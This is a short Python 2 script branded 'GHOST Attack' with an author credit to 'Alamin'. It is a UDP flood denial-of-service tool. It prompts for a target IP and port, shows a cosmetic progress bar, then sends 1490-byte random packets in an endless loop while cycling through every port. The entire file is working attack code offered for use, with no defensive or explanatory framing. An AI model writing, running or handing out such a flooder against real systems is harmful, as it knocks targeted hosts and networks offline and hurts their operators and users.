import sys
import os
import time
import socket
import random
#Code Time
from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

##############
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
#############

os.system("clear")
os.system("figlet GHOST Attack")
os.system("figlet By")
os.system("figlet Alamin")
print
print "Author   : Alamin"
print "github   : https://github.com/GHOST-PSYCHO"
print
ip = raw_input("IP Target : ")
port = input("Port       : ")

os.system("clear")
os.system("figlet Attack Starting")
print "[                    ] 0% "
time.sleep(2)
print "[=====               ] 25%"
time.sleep(1)
print "[==========          ] 50%"
time.sleep(1)
print "[===============     ] 75%"
time.sleep(1)
print "[===3================] 100%"
time.sleep(1)
print "DEVELOPED BY ALAMIN ISLAM"
time.sleep(2)
sent = 0
while True:
     sock.sendto(bytes, (ip,port))
     sent = sent + 1
     port = port + 1
     print "{Coded By Alamin}   Sent %s packet to %s throught port:%s"%(sent,ip,port)
     if port == 65534:
       port = 1

